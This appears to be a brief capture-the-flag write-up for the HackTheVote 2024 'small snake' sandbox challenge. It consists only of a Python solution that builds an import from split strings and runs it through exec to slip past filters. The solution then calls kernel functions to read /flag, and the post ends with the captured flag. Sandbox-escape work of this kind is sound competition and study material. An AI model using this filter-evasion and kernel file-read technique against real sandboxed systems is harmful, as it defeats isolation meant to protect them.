---
layout: post
title:  "small snake WU"
date:   2024-11-05 15:23:10 +0700
categories: write-up HackTheVote2024
author: HSw109
tags: sandbox
---

```python
    var4 = 'i'+'m'+'p'+'o'+'r'+'t'+ ' kernel_ffi'
    exec(var4)
    func = "filp_o"+"pen"
    ffi = kernel_ffi.symbol(func)
    file_path = "/flag"; flags = 0; mode = 0
    var2 = "file = filp_o"+"pen(file_path, flags, mode)"
    exec(var2)
    buffer = kernel_ffi.kmalloc(4096)
    kernel_read = kernel_ffi.symbol("kernel_read")
    pos = 0
    bytes_read = kernel_read(file, buffer, 4096, pos)
    data = kernel_ffi.str(buffer)
    print(data)
```


 flag{its_like_rust_in_the_kernel_but_better}